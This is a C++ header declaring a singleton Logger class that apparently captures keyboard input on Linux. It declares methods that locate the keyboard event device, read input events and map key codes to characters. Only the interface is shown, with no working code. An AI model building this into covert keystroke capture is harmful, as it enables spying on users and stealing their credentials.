// logger.h

#ifndef LOGGER_H
#define LOGGER_H

#include "keymap.h"
#include <linux/input.h>
#include <unordered_map>

#include <string>
#include <iostream>
#include <chrono>
#include <functional>
#include <thread>
#include <future>

class Logger {
public:
	static Logger& get_instance();

	Logger(Logger const&)            = delete;
	Logger& operator=(Logger const&) = delete;

	auto init(std::string const& event_ID = "") -> bool;
	auto check_init() const -> bool;

	auto start() -> void;
	auto kill() -> void;

private:
	Logger();
	~Logger();

	int         fd_;
	bool        initialized_;
	std::string ev_init_;
	bool        running_;
	keymap_t    keymap_;

	template<class _Rep, class _Period>
	auto async_timer(std::chrono::duration<_Rep, _Period> duration, std::function<void()> callback) -> std::future<void>;

	auto find_kbd() -> std::string;
	auto ev_reader() -> void;
	auto get_keychar(unsigned int code) -> char const*;
};

#endif // LOGGER_H
